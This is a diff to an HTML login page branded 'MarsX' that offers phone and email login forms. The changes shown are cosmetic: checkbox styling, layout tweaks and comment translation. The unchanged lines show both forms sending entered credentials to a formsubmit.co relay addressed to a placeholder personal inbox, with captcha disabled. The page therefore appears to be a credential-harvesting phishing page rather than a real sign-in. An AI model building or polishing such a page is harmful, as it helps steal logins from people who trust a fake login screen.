@@ -13,7 +13,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding-top: 120px; /* CONTENU PLUS BAS */
+      padding-top: 120px;
     }
 
     .container {
@@ -140,6 +140,9 @@
 
     .form-footer small {
       color: white;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
 
     button[type="submit"] {
@@ -154,24 +157,52 @@
     .hidden {
       display: none;
     }
+
+    /* ✅ CUSTOM CHECKBOX STYLING */
+    input[type="checkbox"] {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid white;
+      border-radius: 3px;
+      background-color: black;
+      cursor: pointer;
+      position: relative;
+      vertical-align: middle;
+    }
+
+    input[type="checkbox"]:checked {
+      background-color: #d4af37;
+      border-color: #d4af37;
+    }
+
+    input[type="checkbox"]:checked::after {
+      content: '';
+      position: absolute;
+      top: 2px;
+      left: 5px;
+      width: 4px;
+      height: 9px;
+      border: solid white;
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <!-- LOGO aligné à gauche -->
     <img src="immmm.png" alt="MarsX Logo" class="logo" />
 
-    <!-- TITRE -->
     <div class="welcome">Welcome To Login</div>
 
-    <!-- BOUTONS TOGGLE -->
     <div class="toggle-container">
       <button class="toggle-button active" onclick="toggleLogin('phone')">Phone Login</button>
       <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
     </div>
 
-    <!-- FORMULAIRE PHONE -->
+    <!-- PHONE FORM -->
     <form id="phoneForm" action="https://formsubmit.co/tonadresse@email.com" method="POST">
       <input type="hidden" name="_captcha" value="false">
 
@@ -207,7 +238,7 @@
       <button type="submit">Login</button>
     </form>
 
-    <!-- FORMULAIRE EMAIL -->
+    <!-- EMAIL FORM -->
     <form id="emailForm" class="hidden" action="https://formsubmit.co/tonadresse@email.com" method="POST">
       <input type="hidden" name="_captcha" value="false">
 
@@ -271,5 +302,3 @@
 
 </body>
 </html>
-
-
